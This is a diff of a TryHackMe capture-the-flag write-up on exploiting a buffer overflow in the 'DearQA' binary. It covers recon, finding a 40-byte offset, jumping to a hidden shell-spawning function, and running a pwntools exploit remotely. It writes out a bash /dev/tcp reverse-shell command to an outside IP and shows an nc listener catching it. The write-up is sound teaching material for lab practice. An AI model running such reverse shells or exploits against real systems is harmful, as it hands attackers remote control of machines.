@@ -6,24 +6,22 @@ categories:
   - TryHackMe
 ---
 
-<img src='dqa.png' alt='dqa' width=200 >
+{{ post-img src="dqa.png" alt="dqa" style="width: 200px;" > }}
 
 This is a binary exploitation challenge with a buffer overflow vulnerabily
-
 Reminds me of '0xDiablos' challenge I did on hackthebox
-
 Local exploitation first, then remote/development exploit
 
 ## Local exploitation
 
-We get informations first
+We get information first
 
-```
+```bash
 └──╼ $file DearQA.DearQA
 DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
 ```
 
-```
+```bash
 └──╼ $checksec DearQA.DearQA
 [*] '/home/yourUser/Desktop/DearQA.DearQA'
     Arch:     amd64-64-little
@@ -35,7 +33,7 @@ DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically 
 ```
 Then the basics
 
-```
+```bash
 └──╼ $strings  DearQA.DearQA
 /lib64/ld-linux-x86-64.so.2
 libc.so.6
@@ -56,23 +54,19 @@ You have entered in the secret function!
 /bin/bash
 Welcome dearQA
 I am sysadmin, i am new in developing
-What's your name: 
+What's your name:
 Hello: %s
 ;*3$"
 
 ...
-
 ```
 
-A secret function? interresting!
-
-At this point I could fire up Ghidra or IDA, but I find those too powerful
-
+A secret function? interesting!
+At this point I could fire up Ghidra or IDA, but I find those too "powerful"
 I am trying to learn as much as possible so I stick to simpler tools like gdb and r2
-
 So for the moment I use r2 and analyse the binary (I already gave execution permission and tested it)
 
-```
+```bash
 └──╼ $r2 -d ./DearQA.DearQA
 Process with PID 19964 started...
 = attach 19964 19964
@@ -110,13 +104,13 @@ asm.bits 64
 0x004004f0    3 26           sym._init
 0x00400560    1 6            loc.imp.__gmon_start__
 ```
-`main` is usually a good start, but it does nothing special 
+`main` is usually a good start, but it does nothing special
 
 The strings were taling about a "secret function"
 
-Among the symbols we got a `sym.vuln` function that look interresting
+Among the symbols we got a `sym.vuln` function that look interesting
 
-```
+```bash
 [0x7f6147a2f090]> pdf @sym.vuln
 ┌ 61: sym.vuln ();
 │           0x00400686      55             push rbp
@@ -137,20 +131,15 @@ Among the symbols we got a `sym.vuln` function that look interresting
 └           0x004006c2      c3             ret
 ```
 Bingo! that's it! But It's never called in main ( or anywhere ? )
-
 How could we reach it? the answer is: `Buffer Overflow`
-
 When I executed the binary and saw it was taking input I immediately suspected it
-
 You know already how to test for BOF, mad-long inputs!
-
 You can generate them with any tool or do it manually (barbaric)
-
 But it's important to find the right offset (how many characters make a BOF ?)
 
 I found my offset at `40` characters
 
-```
+```bash
 └──╼ $./DearQA.DearQA
 Welcome dearQA
 I am sysadmin, i am new in developing
@@ -161,24 +150,18 @@ Erreur de segmentation
 ```
 
 So now We got what we need! Our objective is to jump to the `vuln` function address
-
 from r2 we got it! it's `0x00400686`
-
 so we just add it to our payload (convert it to little endian first)
-
 I wrote a python script for that, using `pwntools` (I like pwntools)
-
 
 
 ## Remote exploitation
 
 I won't say much here, as we did the hardest part already
-
 We just have to connect to the remote server and send our payload
-
 `pwntools` can do that too. I adapt my script and use it with `python3`
 
-```
+```bash
 └──╼ $python3 bufferoverflow.py
 [*] '/home/nair0lf32/Desktop/Stuff/THM/DearQA/DearQA.DearQA'
     Arch:     amd64-64-little
@@ -195,25 +178,22 @@ We just have to connect to the remote server and send our payload
 [*] Switching to interactive mode
 
 
-
-ctf@dearqa:/home/ctf$ $  
+ctf@dearqa:/home/ctf$ $
 
 ```
 And we did it! the secret function gave us a shell (like shown in local)
-
 Now we have access to the server but we cant see our commands output
-
 We can get a proper shell then
 
-```
+```bash
 ctf@dearqa:/home/ctf$ $ bash -c 'exec bash -i &>/dev/tcp/10.8.226.203/4444 <&1'
 
-$  
+$
 ```
 
 Then our listenner got us in
 
-```
+```bash
 └──╼ $nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 48729
@@ -226,18 +206,15 @@ dearqa.c
 flag.txt
 ```
 
-```ctf@dearqa:/home/ctf$ cat flag.txt
+```bash
+ctf@dearqa:/home/ctf$ cat flag.txt
 cat flag.txt
 THM{Fl4G_Fr0m_Q4_t0_D3v}
 ```
 I am starting to really like those pwn challenges!
-
 Doing further readings I learnt that actually when you examine the memory addresses (gdb or objdump)
-
 after the segfault, you get the offset at 40, but the buffer size is actually 32 bytes
-
 The next 8 bytes are used to reach the RSP and access the vuln function
-
 It doesnt change much as we can fill any characters in the RSP, but it's good to know
 
 Keep learning folks!
